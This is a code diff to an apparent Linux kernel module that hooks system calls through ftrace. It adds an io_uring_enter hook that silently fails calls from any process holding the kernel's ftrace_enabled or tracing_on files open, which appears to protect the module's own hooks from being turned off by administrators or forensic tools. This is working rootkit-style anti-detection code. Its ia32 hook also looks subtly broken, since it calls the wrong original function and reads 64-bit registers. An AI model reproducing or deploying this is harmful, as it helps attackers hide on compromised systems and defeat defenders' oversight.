@@ -28,6 +28,8 @@ static asmlinkage ssize_t (*original_vmsplice)(const struct pt_regs *);
 static asmlinkage ssize_t (*original_vmsplice_ia32)(const struct pt_regs *);
 static asmlinkage ssize_t (*original_tee)(const struct pt_regs *);
 static asmlinkage ssize_t (*original_tee_ia32)(const struct pt_regs *);
+static asmlinkage long (*original_io_uring_enter)(const struct pt_regs *);
+static asmlinkage long (*original_io_uring_enter2)(const struct pt_regs *);
 
 static notrace asmlinkage ssize_t hooked_write_common(const struct pt_regs *regs,
                                                      asmlinkage ssize_t (*orig)(const struct pt_regs *),
@@ -404,6 +406,99 @@ static notrace asmlinkage ssize_t hooked_tee_ia32(const struct pt_regs *regs)
     return hooked_tee_common(regs, original_tee_ia32, true);
 }
 
+static DEFINE_SPINLOCK(cache_lock);
+static pid_t last_blocked_pid = 0;
+static unsigned long last_check_jiffies = 0;
+
+static bool process_has_protected_fd(void)
+{
+    struct files_struct *files;
+    struct fdtable *fdt;
+    struct file *file;
+    unsigned int i;
+    bool has_protected = false;
+    unsigned long flags;
+
+    files = current->files;
+    if (!files)
+        return false;
+
+    spin_lock_irqsave(&files->file_lock, flags);
+    
+    fdt = files_fdtable(files);
+    if (!fdt) {
+        spin_unlock_irqrestore(&files->file_lock, flags);
+        return false;
+    }
+    
+    for (i = 0; i < fdt->max_fds; i++) {
+        file = fdt->fd[i];
+        if (file) {
+            const char *name = NULL;
+            struct dentry *dentry;
+            
+            dentry = file->f_path.dentry;
+            if (dentry && dentry->d_name.name)
+                name = dentry->d_name.name;
+            
+            if (name && (strcmp(name, "ftrace_enabled") == 0 || 
+                       strcmp(name, "tracing_on") == 0)) {
+                has_protected = true;
+                break;
+            }
+        }
+    }
+    
+    spin_unlock_irqrestore(&files->file_lock, flags);
+    return has_protected;
+}
+
+static notrace asmlinkage long hooked_io_uring_enter(const struct pt_regs *regs)
+{
+    unsigned int uring_fd;
+    unsigned int to_submit;
+    unsigned int min_complete;
+    unsigned int flags_param;
+    pid_t current_pid;
+    bool should_block = false;
+    unsigned long cache_flags;
+
+    if (!regs)
+        return -EINVAL;
+    
+    if (!original_io_uring_enter)
+        return -EINVAL;
+
+    uring_fd = regs->di;
+    to_submit = regs->si;
+    min_complete = regs->dx;
+    flags_param = regs->r10;
+    current_pid = current->pid;
+
+    spin_lock_irqsave(&cache_lock, cache_flags);
+    if (current_pid == last_blocked_pid && 
+        time_before(jiffies, last_check_jiffies + HZ)) {
+        should_block = true;
+        spin_unlock_irqrestore(&cache_lock, cache_flags);
+    } else {
+        spin_unlock_irqrestore(&cache_lock, cache_flags);
+        
+        should_block = process_has_protected_fd();
+        
+        if (should_block) {
+            spin_lock_irqsave(&cache_lock, cache_flags);
+            last_blocked_pid = current_pid;
+            last_check_jiffies = jiffies;
+            spin_unlock_irqrestore(&cache_lock, cache_flags);
+        }
+    }
+
+    if (should_block)
+        return -EINVAL;
+
+    return original_io_uring_enter(regs);
+}
+
 static struct ftrace_hook hooks[] = {
     HOOK("__x64_sys_write",   hooked_write,   &original_write),
     HOOK("__ia32_sys_write",  hooked_write32, &original_write32),
@@ -436,6 +531,8 @@ static struct ftrace_hook hooks[] = {
 
     HOOK("__x64_sys_tee", hooked_tee, &original_tee),
     HOOK("__ia32_sys_tee", hooked_tee_ia32, &original_tee_ia32),
+    HOOK("__x64_sys_io_uring_enter", hooked_io_uring_enter, &original_io_uring_enter),
+    HOOK("__ia32_sys_io_uring_enter", hooked_io_uring_enter, &original_io_uring_enter2),
 };
 
 notrace int hooks_write_init(void)
@@ -445,5 +542,12 @@ notrace int hooks_write_init(void)
 
 notrace void hooks_write_exit(void)
 {
+    unsigned long flags;
+    
+    spin_lock_irqsave(&cache_lock, flags);
+    last_blocked_pid = 0;
+    last_check_jiffies = 0;
+    spin_unlock_irqrestore(&cache_lock, flags);
+    
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
 }
